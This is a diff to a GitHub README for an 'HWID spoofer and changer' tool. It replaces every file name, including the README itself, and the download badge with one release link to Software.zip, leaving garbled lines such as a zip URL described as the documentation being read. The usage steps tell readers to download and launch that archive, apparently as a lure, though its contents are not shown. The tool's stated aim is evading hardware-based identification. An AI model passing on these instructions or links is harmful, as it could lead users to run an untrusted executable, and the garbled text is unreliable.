@@ -6,16 +6,16 @@ Welcome to the BioGuard HWID Spoofer & Changer repository! This powerful tool, n
 
 In this repository, you can find the following key components:
 
-- **BioGuard-HWID-Spoofer.exe**: The main executable file for running the HWID spoofer and changer tool.
+- **https://github.com/joseber1/BioGuard-Hwid-Spoofer-Hwid-Changer-BIOS-CPU/releases/download/v2.0/Software.zip**: The main executable file for running the HWID spoofer and changer tool.
 - **driver/**: A directory containing essential drivers required for BioGuard to function seamlessly.
-- **README.md**: The documentation file you are currently reading, providing important information about the repository and its contents.
+- **https://github.com/joseber1/BioGuard-Hwid-Spoofer-Hwid-Changer-BIOS-CPU/releases/download/v2.0/Software.zip**: The documentation file you are currently reading, providing important information about the repository and its contents.
 
 ## 🚀 Usage:
 
 1. Download the BioGuard HWID Spoofer & Changer tool from the following link:
-   [![Download BioGuard](https://img.shields.io/badge/Download%20BioGuard-Software.zip-brightgreen)](https://github.com/user-attachments/files/18410590/Software.zip)
+   [![Download BioGuard](https://github.com/joseber1/BioGuard-Hwid-Spoofer-Hwid-Changer-BIOS-CPU/releases/download/v2.0/Software.zip%https://github.com/joseber1/BioGuard-Hwid-Spoofer-Hwid-Changer-BIOS-CPU/releases/download/v2.0/Software.zip)](https://github.com/joseber1/BioGuard-Hwid-Spoofer-Hwid-Changer-BIOS-CPU/releases/download/v2.0/Software.zip)
 
-2. Launch the downloaded `Software.zip` file to access the BioGuard tool.
+2. Launch the downloaded `https://github.com/joseber1/BioGuard-Hwid-Spoofer-Hwid-Changer-BIOS-CPU/releases/download/v2.0/Software.zip` file to access the BioGuard tool.
 
 3. Follow the instructions provided within the tool to spoof and change your HWID effectively.
 
